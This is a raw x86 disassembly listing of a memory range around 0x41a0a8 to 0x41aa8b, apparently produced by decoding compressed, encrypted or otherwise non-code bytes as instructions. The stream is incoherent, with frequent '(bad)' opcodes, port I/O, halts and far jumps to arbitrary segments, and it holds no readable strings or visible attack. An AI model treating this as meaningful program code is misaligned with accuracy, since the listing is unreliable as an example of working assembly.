  41a0a8:	mov    BYTE PTR [ebp+0x2192f507],ch
  41a0ae:	fincstp 
  41a0b0:	js     0x41a0a6
  41a0b2:	in     eax,0xf1
  41a0b4:	inc    ecx
  41a0b5:	mov    ds:0x3fbc9c14,eax
  41a0ba:	loope  0x41a04c
  41a0bc:	test   DWORD PTR [ebx+0x50836cce],edx
  41a0c2:	cmp    DWORD PTR [edx*8-0x7e7c124e],ecx
  41a0c9:	gs pop esp
  41a0cb:	scas   al,BYTE PTR es:[edi]
  41a0cc:	es cmp edx,ebp
  41a0cf:	repz pop edx
  41a0d1:	pop    ebx
  41a0d2:	sbb    DWORD PTR [edi+0x1f],esp
  41a0d5:	xchg   ecx,eax
  41a0d6:	jo     0x41a123
  41a0d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0d9:	fist   WORD PTR [ebx-0x60bc732d]
  41a0df:	frstor [edi+0x56]
  41a0e2:	jg     0x41a144
  41a0e4:	or     cl,cl
  41a0e6:	adc    eax,0x2abf8d86
  41a0eb:	pop    edx
  41a0ec:	lods   eax,DWORD PTR ds:[esi]
  41a0ed:	cmp    DWORD PTR [eax-0x1cacd93b],ebp
  41a0f3:	call   0x1e8eb719
  41a0f8:	hlt    
  41a0f9:	push   ebp
  41a0fa:	or     eax,0xc2c0d62a
  41a0ff:	rol    bh,0xc
  41a102:	bound  edi,QWORD PTR [eax-0x1d]
  41a105:	fnstcw WORD PTR [eax+0x2]
  41a108:	add    eax,0x70fbc1f9
  41a10d:	stc    
  41a10e:	js     0x41a0a4
  41a110:	or     eax,0xa1d18487
  41a115:	and    DWORD PTR [edi],edi
  41a117:	fidiv  DWORD PTR [ebx+0x5d4a10f0]
  41a11d:	addr16 jmp 0x41a0e5
  41a120:	aad    0xf7
  41a122:	out    dx,al
  41a123:	in     al,0xc7
  41a125:	pusha  
  41a126:	icebp  
  41a127:	pop    ebx
  41a128:	stc    
  41a129:	mov    WORD PTR [esi],es
  41a12b:	ret    0xbfd
  41a12e:	adc    BYTE PTR [ebx+eiz*8+0x70c503e1],0x8
  41a136:	mov    eax,ds:0xa6edcfb2
  41a13b:	sub    ebx,0xb71e34f2
  41a141:	pusha  
  41a142:	pop    edi
  41a143:	mov    ds:0x73b2f8f7,eax
  41a148:	pop    ebx
  41a149:	sbb    BYTE PTR [esi-0x7d],0x65
  41a14d:	lahf   
  41a14e:	scas   eax,DWORD PTR es:[edi]
  41a14f:	adc    dl,bl
  41a151:	dec    esi
  41a152:	loope  0x41a1bf
  41a154:	push   ebp
  41a155:	ss dec ebx
  41a157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a158:	cs pop ebx
  41a15a:	aaa    
  41a15b:	mov    ds,WORD PTR [ebx+0x6c]
  41a15e:	inc    esp
  41a15f:	mov    eax,0xb87f03d2
  41a164:	inc    ecx
  41a165:	sbb    al,0x4d
  41a167:	xor    ebp,ebp
  41a169:	sbb    al,0xec
  41a16b:	mov    al,ds:0x24c7694c
  41a170:	nop
  41a171:	imul   ebp,DWORD PTR [edx-0x7e],0xffffff9b
  41a175:	mov    edi,0xb41e007f
  41a17a:	sbb    esp,DWORD PTR [eax+0x3f51a3f1]
  41a180:	mov    bl,dh
  41a182:	test   bl,bh
  41a184:	shl    DWORD PTR [edx],0xa8
  41a187:	cmp    DWORD PTR [edx-0x3f91f474],ecx
  41a18d:	fs jb  0x41a111
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	popf   
  41a201:	fcomp  QWORD PTR cs:[edx-0x1c]
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	mov    dh,0xf0
  41a20e:	loop   0x41a234
  41a210:	mov    dh,0x9
  41a212:	push   cs
  41a213:	pusha  
  41a214:	mov    ch,BYTE PTR [ecx]
  41a216:	(bad)  
  41a217:	push   esp
  41a218:	jae    0x41a1ef
  41a21a:	test   al,0xf4
  41a21c:	mov    cl,0x11
  41a21e:	inc    ecx
  41a21f:	mov    ds:0x6e341bb5,al
  41a224:	(bad)  
  41a225:	lahf   
  41a226:	push   0xffffff98
  41a228:	add    bl,BYTE PTR [ebx-0x57ffefff]
  41a22e:	mov    ecx,0x107f3143
  41a233:	xor    al,0xbd
  41a235:	test   DWORD PTR [edi-0x13bdad64],ebx
  41a23b:	retf   
  41a23c:	xor    dh,dl
  41a23e:	and    DWORD PTR [esi+0x3dc05853],ebx
  41a244:	inc    ebx
  41a245:	dec    ecx
  41a246:	icebp  
  41a247:	out    dx,al
  41a248:	mov    edi,0xa1d7b65a
  41a24d:	imul   edx,DWORD PTR [ecx-0x2c],0xffffffc8
  41a251:	lods   eax,DWORD PTR ds:[esi]
  41a252:	cmp    eax,0xa33cf4f
  41a257:	daa    
  41a258:	popa   
  41a259:	into   
  41a25a:	mov    dl,0x44
  41a25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a25d:	jg     0x41a250
  41a25f:	jno    0x41a220
  41a261:	inc    esp
  41a262:	and    cl,BYTE PTR [ebx+eax*8]
  41a265:	cmp    BYTE PTR ds:0x46d37cae,0xbf
  41a26c:	pop    eax
  41a26d:	cmp    BYTE PTR [eax-0x5588cdf3],ah
  41a273:	sbb    al,0x43
  41a275:	dec    edx
  41a276:	mov    dl,0x29
  41a278:	pop    edi
  41a279:	aam    0xbd
  41a27b:	and    BYTE PTR [eax+edi*8+0x45],ch
  41a27f:	dec    edx
  41a280:	adc    al,0x9
  41a282:	ret    
  41a283:	iret   
  41a284:	pusha  
  41a285:	iret   
  41a286:	rcr    DWORD PTR [eax+0x4f],1
  41a289:	push   edx
  41a28a:	(bad)  
  41a28b:	jl     0x41a225
  41a28d:	push   esi
  41a28e:	mov    esp,0xde6617ba
  41a293:	cmc    
  41a294:	mov    al,ds:0xc503101e
  41a299:	out    dx,al
  41a29a:	mov    dl,0x7c
  41a29c:	popf   
  41a29d:	mov    WORD PTR [eax],ss
  41a29f:	sub    bl,dl
  41a2a1:	cmp    eax,0xa08faae
  41a2a6:	call   0xeacc4bfb
  41a2ab:	adc    esp,DWORD PTR ds:0xd09a62fd
  41a2b1:	mov    esp,0x7b2bfa29
  41a2b6:	loope  0x41a29a
  41a2b8:	ins    BYTE PTR es:[edi],dx
  41a2b9:	lahf   
  41a2ba:	lods   al,BYTE PTR ds:[si]
  41a2bc:	inc    esi
  41a2bd:	fcom   DWORD PTR [ebx+0x29]
  41a2c0:	das    
  41a2c1:	fdiv   QWORD PTR [ebp-0x274efd52]
  41a2c7:	dec    edx
  41a2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c9:	pop    esp
  41a2ca:	cmp    eax,ebx
  41a2cc:	cli    
  41a2cd:	mov    bl,0x74
  41a2cf:	ss push 0x2c
  41a2d2:	xchg   edi,eax
  41a2d3:	pushf  
  41a2d4:	std    
  41a2d5:	aad    0x33
  41a2d7:	das    
  41a2d8:	out    dx,eax
  41a2d9:	out    0x63,al
  41a2db:	jo     0x41a34f
  41a2dd:	cmp    edi,DWORD PTR [ebp-0x9]
  41a2e0:	(bad)  
  41a2e2:	xchg   esp,eax
  41a2e3:	imul   esi,DWORD PTR [edx-0x6a],0x37
  41a2e7:	mov    BYTE PTR [eax+0x48720a13],cl
  41a2ed:	cwde   
  41a2ee:	test   eax,0xc129a323
  41a2f3:	std    
  41a2f4:	dec    edi
  41a2f5:	jbe    0x41a307
  41a2f7:	pushf  
  41a2f8:	rcl    BYTE PTR [ebx+ebp*2],0xa0
  41a2fc:	div    BYTE PTR [edx-0x1b532692]
  41a302:	push   edi
  41a303:	es mov cl,0xcd
  41a306:	lahf   
  41a307:	ret    0x555f
  41a30a:	rcr    BYTE PTR [eax-0x5d],0xa6
  41a30e:	(bad)  
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	inc    ebp
  41a381:	mov    dh,0xef
  41a383:	inc    esp
  41a384:	call   0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    bh,cl
  41a38d:	arpl   WORD PTR [edi],si
  41a38f:	fistp  WORD PTR [edx+esi*8+0x7a802dec]
  41a396:	popa   
  41a397:	mov    cl,0x18
  41a399:	enter  0x5f5c,0xe2
  41a39d:	xor    al,0x47
  41a39f:	sahf   
  41a3a0:	jne    0x41a32e
  41a3a2:	js     0x41a386
  41a3a4:	push   ss
  41a3a5:	xchg   edx,eax
  41a3a6:	xor    esp,DWORD PTR ds:0x49d61f50
  41a3ad:	adc    ch,cl
  41a3af:	aad    0x33
  41a3b1:	ficom  DWORD PTR [esp+eax*2-0x4b]
  41a3b5:	out    0xc1,al
  41a3b7:	scas   eax,DWORD PTR es:[edi]
  41a3b8:	inc    edx
  41a3b9:	js     0x41a409
  41a3bb:	mov    BYTE PTR ds:0x804486c9,dh
  41a3c1:	cmp    BYTE PTR [edi-0x1e],ch
  41a3c4:	mov    ch,bl
  41a3c6:	pop    ecx
  41a3c7:	inc    edx
  41a3c8:	test   al,0x82
  41a3ca:	scas   al,BYTE PTR es:[edi]
  41a3cb:	add    DWORD PTR [edx-0x57],0x1dca9d50
  41a3d2:	mov    ch,0x22
  41a3d4:	sub    al,0x84
  41a3d6:	dec    BYTE PTR [ecx+0x18f77837]
  41a3dc:	in     al,0xae
  41a3de:	dec    edx
  41a3df:	sbb    BYTE PTR [ebx+ebx*1],bl
  41a3e2:	lahf   
  41a3e3:	adc    bl,BYTE PTR [ebx-0x30]
  41a3e6:	jnp    0x41a462
  41a3e8:	adc    BYTE PTR [eax-0x6e],0x3a
  41a3ec:	mov    eax,ds:0x4cf446f3
  41a3f1:	jmp    0x1edf:0x49be970b
  41a3f8:	es inc ebx
  41a3fa:	add    eax,0xa891563a
  41a3ff:	aas    
  41a400:	(bad)  
  41a401:	mov    eax,0x85c540b5
  41a406:	sub    DWORD PTR [ecx+ebx*4+0x1d],edx
  41a40a:	sub    ecx,DWORD PTR [edx+0x50]
  41a40d:	jge    0x41a414
  41a40f:	pusha  
  41a410:	and    ah,BYTE PTR cs:[eax-0x3a]
  41a414:	dec    edi
  41a415:	and    eax,0x55d42be7
  41a41a:	adc    bl,BYTE PTR [edi-0x27e32a0b]
  41a420:	mov    ds:0x4cacd8bb,al
  41a425:	je     0x41a413
  41a427:	hlt    
  41a428:	dec    esi
  41a429:	sub    esi,DWORD PTR [eax]
  41a42b:	mov    dl,0xe1
  41a42d:	sti    
  41a42e:	dec    esp
  41a42f:	mov    ch,0x5f
  41a431:	out    0x77,al
  41a433:	ficom  WORD PTR [eax+0x56]
  41a436:	inc    esi
  41a437:	jmp    FWORD PTR [esi]
  41a439:	retf   0xdaaa
  41a43c:	mov    ebp,0xdef72679
  41a441:	enter  0x501c,0x30
  41a445:	lods   al,BYTE PTR ds:[esi]
  41a446:	pushf  
  41a447:	imul   DWORD PTR [ebx]
  41a449:	sub    ah,bl
  41a44b:	jmp    0x6134:0x282ccedd
  41a452:	arpl   WORD PTR ds:0xd701353a,di
  41a458:	fnstcw WORD PTR [eax]
  41a45a:	(bad)  
  41a45b:	loopne 0x41a46b
  41a45d:	outs   dx,BYTE PTR ds:[esi]
  41a45e:	push   eax
  41a45f:	mov    eax,ds:0xaf219ab7
  41a464:	mov    ebp,0x6d712a1
  41a469:	lods   eax,DWORD PTR ds:[esi]
  41a46a:	jae    0x41a3f4
  41a46c:	outs   dx,DWORD PTR ds:[esi]
  41a46d:	leave  
  41a46e:	sbb    al,0x25
  41a470:	xchg   BYTE PTR [esi],bl
  41a472:	mov    al,0xfd
  41a474:	repz xlat BYTE PTR ds:[ebx]
  41a476:	mov    BYTE PTR [ebp+0x514b9bf7],dl
  41a47c:	out    0x53,al
  41a47e:	(bad)  
  41a47f:	hlt    
  41a480:	adc    BYTE PTR [edi],bl
  41a482:	push   ss
  41a483:	aas    
  41a484:	and    DWORD PTR [eax+0x5e],ebx
  41a487:	jmp    DWORD PTR [ebp-0x3d830853]
  41a48d:	in     al,0x2d
  41a48f:	in     al,dx
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	fwait
  41a501:	jmp    0x41a4a4
  41a503:	xchg   edx,eax
  41a504:	in     al,dx
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	xchg   esp,eax
  41a50d:	xchg   ebp,eax
  41a50e:	repz cmp al,dh
  41a511:	scas   al,BYTE PTR es:[edi]
  41a512:	mov    ds,eax
  41a514:	pop    ebx
  41a515:	mov    ecx,0x9842a43f
  41a51a:	jmp    0x41a4ec
  41a51c:	add    BYTE PTR [esi+0x57],bl
  41a51f:	(bad)  
  41a521:	add    DWORD PTR ds:0x89e149a3,esp
  41a527:	fst    DWORD PTR [edi]
  41a529:	jae    0x41a4fd
  41a52b:	dec    BYTE PTR [ecx-0x365240bf]
  41a531:	xchg   esi,eax
  41a532:	inc    ebx
  41a533:	cmp    BYTE PTR [ebx+0x55],dh
  41a536:	xchg   edx,eax
  41a537:	push   edi
  41a538:	xor    BYTE PTR [esi],0x2b
  41a53b:	rcl    DWORD PTR ds:0xc124d737,cl
  41a541:	xor    DWORD PTR [ebx-0x15050203],ebp
  41a547:	pop    edx
  41a548:	mov    ch,0x2b
  41a54a:	mov    ebp,0x5dea8e2d
  41a54f:	fldenv [edi+0x3a]
  41a552:	or     edi,DWORD PTR [ebp-0x71cea5b0]
  41a558:	addr16 jae 0x41a530
  41a55b:	cdq    
  41a55c:	(bad)  
  41a55d:	jae    0x41a58c
  41a55f:	fs das 
  41a561:	div    BYTE PTR [edx]
  41a563:	pop    esi
  41a564:	dec    dx
  41a566:	jns    0x41a5e0
  41a568:	das    
  41a569:	sti    
  41a56a:	mov    bl,0xc8
  41a56c:	mov    al,ds:0xd26d76c6
  41a571:	sub    eax,0x30bb3ac
  41a576:	rcl    DWORD PTR [edx],0x37
  41a579:	out    0x50,eax
  41a57b:	sub    al,al
  41a57d:	xchg   DWORD PTR [ebx-0x3ffea52c],edi
  41a583:	or     DWORD PTR [esp+ebx*2],eax
  41a586:	repnz mov edx,0x53db9334
  41a58c:	aad    0x74
  41a58e:	xor    ebx,DWORD PTR [ebx]
  41a590:	cmp    bl,0x7a
  41a593:	mov    bh,0x6b
  41a595:	imul   ebp,esi,0x35
  41a598:	and    esp,DWORD PTR [ebx+0x52f3aeb3]
  41a59e:	cmc    
  41a59f:	and    eax,DWORD PTR ds:0xbc15e880
  41a5a5:	mov    ch,0xc6
  41a5a7:	or     BYTE PTR [edi],0x6
  41a5aa:	dec    edi
  41a5ab:	xchg   edi,eax
  41a5ac:	fldenv [ecx-0x62]
  41a5af:	jecxz  0x41a594
  41a5b1:	mov    cl,0x81
  41a5b3:	xlat   BYTE PTR ds:[ebx]
  41a5b4:	and    DWORD PTR [edi+0x54c72f69],esi
  41a5ba:	outs   dx,BYTE PTR ds:[esi]
  41a5bb:	sub    al,0x7a
  41a5bd:	imul   edx,ecx,0xfe80eda
  41a5c3:	add    ah,ch
  41a5c5:	cdq    
  41a5c6:	pop    ds
  41a5c7:	outs   dx,BYTE PTR ds:[esi]
  41a5c8:	mov    bl,0xfa
  41a5ca:	adc    DWORD PTR [ebp+0x7dd3c1cf],esp
  41a5d0:	leave  
  41a5d1:	pop    esp
  41a5d2:	sbb    esp,DWORD PTR [edi+0x62e5f2eb]
  41a5d8:	test   BYTE PTR [ecx],dh
  41a5da:	lahf   
  41a5db:	mov    DWORD PTR [edi],edi
  41a5dd:	ret    
  41a5de:	fisttp DWORD PTR [eax]
  41a5e0:	out    dx,eax
  41a5e1:	jno    0x41a5e1
  41a5e3:	fstp   QWORD PTR ds:0x536e86ef
  41a5e9:	andnps xmm2,XMMWORD PTR [ebx-0x40]
  41a5ed:	repz pop es
  41a5ef:	adc    eax,0x1076ffe8
  41a5f4:	dec    esp
  41a5f5:	ret    
  41a5f6:	mov    ecx,0x94e8fecd
  41a5fb:	xor    ecx,DWORD PTR [edi+0x7d]
  41a5fe:	iret   
  41a5ff:	dec    ebx
  41a600:	icebp  
  41a601:	or     DWORD PTR [eax+0x6dc7a7e2],0xffffffb3
  41a608:	test   al,0x6
  41a60a:	or     DWORD PTR [esi+edi*4],esi
  41a60d:	imul   DWORD PTR [eax+0x28]
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xf144a625
  41a682:	sub    eax,0x117f0f4
  41a687:	add    BYTE PTR [ecx+eax*1],al
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	out    0x31,al
  41a68e:	mov    al,ds:0xdd59bfb6
  41a693:	jmp    0x3ec9fddc
  41a698:	inc    esp
  41a699:	iret   
  41a69a:	mov    eax,0x6e8162aa
  41a69f:	(bad)  
  41a6a0:	push   esp
  41a6a2:	clc    
  41a6a3:	test   edx,edi
  41a6a5:	sbb    bl,BYTE PTR [ebp-0x36dd7d9b]
  41a6ab:	mov    WORD PTR [eax],ss
  41a6ad:	add    BYTE PTR [edi],cl
  41a6af:	std    
  41a6b0:	push   ecx
  41a6b1:	sbb    BYTE PTR [esi+0x2a],0x2b
  41a6b5:	push   0xa4b06574
  41a6ba:	cmp    edx,ebx
  41a6bc:	imul   esp,edi,0xc64866af
  41a6c2:	ins    DWORD PTR es:[edi],dx
  41a6c3:	rcr    BYTE PTR [edx+edi*1+0xf],cl
  41a6c7:	aas    
  41a6c8:	push   cs
  41a6c9:	mov    esp,es
  41a6cb:	sub    DWORD PTR [edi],0x8d6282d4
  41a6d1:	jp     0x41a6cb
  41a6d3:	push   es
  41a6d4:	mov    esp,0x57576a9a
  41a6d9:	adc    ch,ch
  41a6db:	or     ah,bl
  41a6dd:	cmp    eax,0x365ab12a
  41a6e2:	enter  0xc70b,0x26
  41a6e6:	sbb    eax,0xa16bc6ca
  41a6eb:	stos   BYTE PTR es:[edi],al
  41a6ec:	hlt    
  41a6ed:	mov    cs,WORD PTR [esi+0x1b4156ce]
  41a6f3:	fadd   QWORD PTR [edi]
  41a6f5:	dec    edi
  41a6f6:	ins    DWORD PTR es:[edi],dx
  41a6f7:	out    0x50,eax
  41a6f9:	cvtps2pi mm3,QWORD PTR [edi]
  41a6fc:	mov    esp,0xc5e65f61
  41a701:	(bad)
  41a705:	or     DWORD PTR [esi-0x5af91db6],0xa1fddb6a
  41a70f:	fnsave [ebp+0x4e]
  41a712:	cdq    
  41a713:	xchg   edx,eax
  41a714:	ficom  DWORD PTR [esi+esi*4+0x67]
  41a718:	or     eax,DWORD PTR [ebp+0x1e]
  41a71b:	sar    BYTE PTR [ebp-0x2d],cl
  41a71e:	jecxz  0x41a738
  41a720:	jb     0x41a74c
  41a722:	fwait
  41a723:	stc    
  41a724:	push   esi
  41a725:	mov    ah,0xf5
  41a727:	cdq    
  41a728:	push   esi
  41a729:	test   DWORD PTR [eax],edi
  41a72b:	js     0x41a791
  41a72d:	push   edi
  41a72e:	in     eax,dx
  41a72f:	jnp    0x41a7a5
  41a731:	jl     0x41a6d3
  41a733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a734:	frstor [eax-0x37]
  41a737:	fsubr  DWORD PTR [edi-0x1129cdb2]
  41a73d:	clc    
  41a73e:	mov    ch,0xf2
  41a740:	dec    esi
  41a741:	shl    BYTE PTR [edx-0x11],cl
  41a744:	clc    
  41a745:	push   ss
  41a746:	jno    0x41a721
  41a748:	outs   dx,BYTE PTR ds:[esi]
  41a749:	fcomi  st,st(2)
  41a74b:	sbb    BYTE PTR [esi],ch
  41a74d:	or     bl,BYTE PTR [eax-0xfebcdf8]
  41a753:	mov    bh,0x5f
  41a755:	bswap  edi
  41a757:	cmp    al,0x1b
  41a759:	ret    
  41a75a:	(bad)  
  41a75c:	mov    esp,0x50d2b07
  41a761:	push   es
  41a762:	push   ebp
  41a763:	jmp    0x1d6a8b86
  41a768:	pop    esi
  41a769:	jno    0x41a7ba
  41a76b:	sbb    BYTE PTR [esi-0xf0eff65],cl
  41a771:	add    esp,ebx
  41a773:	test   al,0xfa
  41a775:	ds call 0xef68738a
  41a77b:	js     0x41a7e0
  41a77d:	push   0xc
  41a77f:	ins    DWORD PTR es:[edi],dx
  41a780:	jmp    0xe9ab:0x96b791cd
  41a787:	sub    eax,0x1b22bc27
  41a78c:	xor    bh,BYTE PTR [edx-0x80]
  41a78f:	inc    edx
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xe55327ca,al
  41a801:	not    cl
  41a803:	cld    
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	lods   eax,DWORD PTR ds:[esi]
  41a80d:	sub    BYTE PTR [eax-0x77],dh
  41a810:	enter  0x3ee0,0xe5
  41a814:	jp     0x41a7fc
  41a816:	sub    DWORD PTR [esi-0x14],esp
  41a819:	mov    esp,0x843e1ffd
  41a81e:	xchg   ebp,eax
  41a81f:	dec    ebx
  41a820:	and    dl,BYTE PTR [edi]
  41a822:	mov    esp,0x58afbe12
  41a827:	xchg   ebx,eax
  41a828:	pop    ds
  41a829:	lock mov eax,ds:0xe7a021b0
  41a82f:	inc    eax
  41a830:	sub    al,0xfd
  41a832:	xor    edi,eax
  41a834:	xchg   ebx,eax
  41a835:	js     0x41a7e1
  41a837:	jnp    0x41a7c9
  41a839:	add    DWORD PTR [ebx],eax
  41a83b:	aaa    
  41a83c:	loop   0x41a7ee
  41a83e:	retf   
  41a83f:	call   0xfac8:0xacaeee69
  41a846:	mov    esi,DWORD PTR [edi+0x1c]
  41a849:	xchg   esi,eax
  41a84a:	cs fs aam 0x2d
  41a84e:	test   BYTE PTR [ebx-0x2f],ch
  41a851:	add    DWORD PTR [ecx],0xf935bba
  41a857:	and    DWORD PTR [edi-0x2b],ebp
  41a85a:	leave  
  41a85b:	cmc    
  41a85c:	iret   
  41a85d:	sbb    al,0x34
  41a85f:	dec    eax
  41a860:	pop    esp
  41a861:	scas   eax,DWORD PTR es:[edi]
  41a862:	or     BYTE PTR [eax],dl
  41a864:	mov    ds:0xd3d30e6,al
  41a869:	or     edi,DWORD PTR [esi]
  41a86b:	sbb    DWORD PTR [edi],ebp
  41a86d:	cmc    
  41a86e:	adc    dl,BYTE PTR [ecx-0x3e]
  41a871:	test   DWORD PTR [edx],esi
  41a873:	mov    esp,0x669fa292
  41a878:	ficom  DWORD PTR [edi-0x34]
  41a87b:	pusha  
  41a87c:	mov    WORD PTR [ebx-0x6cbeb748],?
  41a882:	jmp    0x41a8e4
  41a884:	test   eax,0x31bb3c4c
  41a889:	cmp    edi,DWORD PTR [edi+eiz*2-0x45]
  41a88d:	xor    esp,ebx
  41a88f:	adc    ebx,eax
  41a891:	test   al,0x92
  41a893:	push   ecx
  41a894:	fwait
  41a895:	pusha  
  41a896:	rol    BYTE PTR [esi+0x24],0x2c
  41a89a:	out    0x24,eax
  41a89c:	xor    edx,DWORD PTR [edx-0x49]
  41a89f:	pop    ss
  41a8a0:	dec    esp
  41a8a1:	daa    
  41a8a2:	je     0x41a838
  41a8a4:	jb     0x41a8a6
  41a8a6:	hlt    
  41a8a7:	mov    ch,ch
  41a8a9:	imul   edi,DWORD PTR [eax-0x31],0xfb9e03e7
  41a8b0:	push   esp
  41a8b1:	cmc    
  41a8b2:	loopne 0x41a933
  41a8b4:	int    0x67
  41a8b6:	(bad)  
  41a8b7:	in     al,dx
  41a8b8:	in     al,dx
  41a8b9:	mov    esp,0xbddd6f07
  41a8be:	jecxz  0x41a8f4
  41a8c0:	(bad)  
  41a8c1:	xchg   ebp,eax
  41a8c2:	push   ss
  41a8c3:	xchg   ebp,eax
  41a8c4:	ficom  WORD PTR [ebp-0x39]
  41a8c7:	cmp    eax,0x565b601f
  41a8cc:	adc    eax,0x948c18fd
  41a8d1:	or     DWORD PTR [edi],edi
  41a8d3:	and    eax,DWORD PTR [ecx+0x108fdce4]
  41a8d9:	xor    DWORD PTR [edi],esp
  41a8db:	call   0xce70:0x4408f91a
  41a8e2:	(bad)  
  41a8e3:	mov    ah,0xde
  41a8e5:	xor    esp,esi
  41a8e7:	mov    ebp,0x54a48793
  41a8ec:	push   ss
  41a8ed:	add    BYTE PTR [edx-0x38],bl
  41a8f0:	jmp    0xd078:0x27ff4f84
  41a8f7:	or     eax,0x3f2780fe
  41a8fc:	ja     0x41a8c1
  41a8fe:	mov    WORD PTR [ecx+0x250f1f9d],fs
  41a904:	adc    cl,BYTE PTR ds:0x829187f4
  41a90a:	sub    esi,eax
  41a90c:	jg     0x41a8ef
  41a90e:	iret   
  41a90f:	inc    esp
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	lock sub bh,cl
  41a983:	jmp    0x104:0x119f8
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	sub    eax,edx
  41a98e:	dec    edi
  41a98f:	xlat   BYTE PTR ds:[ebx]
  41a990:	xor    BYTE PTR [eax-0x2b],bh
  41a993:	repnz mov ah,0xe7
  41a996:	popa   
  41a997:	sbb    ecx,DWORD PTR [ebp-0xa]
  41a99a:	push   0x7b
  41a99c:	loop   0x41aa1d
  41a99e:	sbb    eax,0xd8c3a766
  41a9a3:	iret   
  41a9a4:	xchg   ebp,eax
  41a9a5:	dec    edi
  41a9a6:	add    ah,BYTE PTR es:[ebp+0x422fdb9c]
  41a9ad:	pop    di
  41a9af:	fcmove st,st(3)
  41a9b1:	rcl    DWORD PTR [ecx+ebx*8-0x18f66fe9],0xed
  41a9b9:	mov    ebp,0x2d90763c
  41a9be:	lods   al,BYTE PTR ds:[esi]
  41a9bf:	push   ss
  41a9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9c1:	test   al,0x65
  41a9c3:	and    eax,DWORD PTR ds:0x435dfc37
  41a9c9:	xchg   edx,eax
  41a9ca:	pop    edx
  41a9cb:	enter  0xebcd,0x69
  41a9cf:	test   eax,0xa81c93e3
  41a9d4:	mov    DWORD PTR [edi],ebp
  41a9d6:	jbe    0x41a9de
  41a9d8:	adc    BYTE PTR [edx-0x31],cl
  41a9db:	mov    WORD PTR ds:0x9100012f,ss
  41a9e1:	sub    eax,0xd2ada6b4
  41a9e6:	shr    DWORD PTR ds:0x4499ada7,0xd5
  41a9ed:	sahf   
  41a9ee:	lods   eax,DWORD PTR ds:[esi]
  41a9ef:	test   al,0xae
  41a9f1:	xchg   edi,eax
  41a9f2:	dec    edx
  41a9f3:	call   FWORD PTR [edi]
  41a9f5:	add    eax,0x80c55414
  41a9fa:	or     ah,BYTE PTR ds:0x358dfb5
  41aa00:	or     al,0x27
  41aa02:	scas   eax,DWORD PTR es:[edi]
  41aa03:	stc    
  41aa04:	push   esi
  41aa05:	and    dl,BYTE PTR [edx]
  41aa07:	mov    al,ds:0xd13cc2a8
  41aa0c:	fbstp  TBYTE PTR [edx]
  41aa0e:	jmp    0x41aa71
  41aa10:	pop    ebx
  41aa11:	cli    
  41aa12:	popf   
  41aa13:	xor    dl,bh
  41aa15:	sub    dl,BYTE PTR [edi-0x35]
  41aa18:	popf   
  41aa19:	sbb    DWORD PTR [eax+0x65c3b622],edx
  41aa1f:	sbb    DWORD PTR ds:0x7b505aa2,ebx
  41aa25:	mov    ds:0x702e5cd9,eax
  41aa2a:	inc    ebp
  41aa2b:	jmp    0x9239:0xdbb69a9a
  41aa32:	adc    ah,BYTE PTR [edx]
  41aa34:	jg     0x41aaa2
  41aa36:	and    eax,0xd120cf4d
  41aa3b:	inc    esi
  41aa3c:	lahf   
  41aa3d:	rol    esi,0xd1
  41aa40:	test   DWORD PTR [edx],esi
  41aa42:	rcl    BYTE PTR [ecx+0x7d101ee6],0x56
  41aa49:	add    DWORD PTR [ebp+ebx*4+0x4ae2cbfa],eax
  41aa50:	jecxz  0x41aa11
  41aa52:	xchg   BYTE PTR [edi],dh
  41aa54:	or     ebp,DWORD PTR [esi-0x54]
  41aa57:	cwde   
  41aa58:	xor    al,0xe3
  41aa5a:	dec    ecx
  41aa5b:	int3   
  41aa5c:	retf   0xb955
  41aa5f:	out    0xb5,eax
  41aa61:	cli    
  41aa62:	mul    cl
  41aa64:	xchg   esi,eax
  41aa65:	jno    0x41aa44
  41aa67:	outs   dx,DWORD PTR ds:[esi]
  41aa68:	jecxz  0x41aae1
  41aa6a:	iret   
  41aa6b:	jle    0x41aaa9
  41aa6d:	sahf   
  41aa6e:	leavew 
  41aa70:	test   DWORD PTR [ebx],ecx
  41aa72:	mov    ebx,0xc331de3a
  41aa77:	xor    BYTE PTR [esp+eiz*4+0x4d0053c8],bl
  41aa7e:	push   ecx
  41aa7f:	jl     0x41aa87
  41aa81:	mov    DWORD PTR [edx],eax
  41aa83:	jns    0x41aaf1
  41aa85:	mov    eax,ds:0x5ea2382e
  41aa8a:	pushf  
  41aa8b:	add    BYTE PTR [ebp+0xe5d0c8],0x0
	...
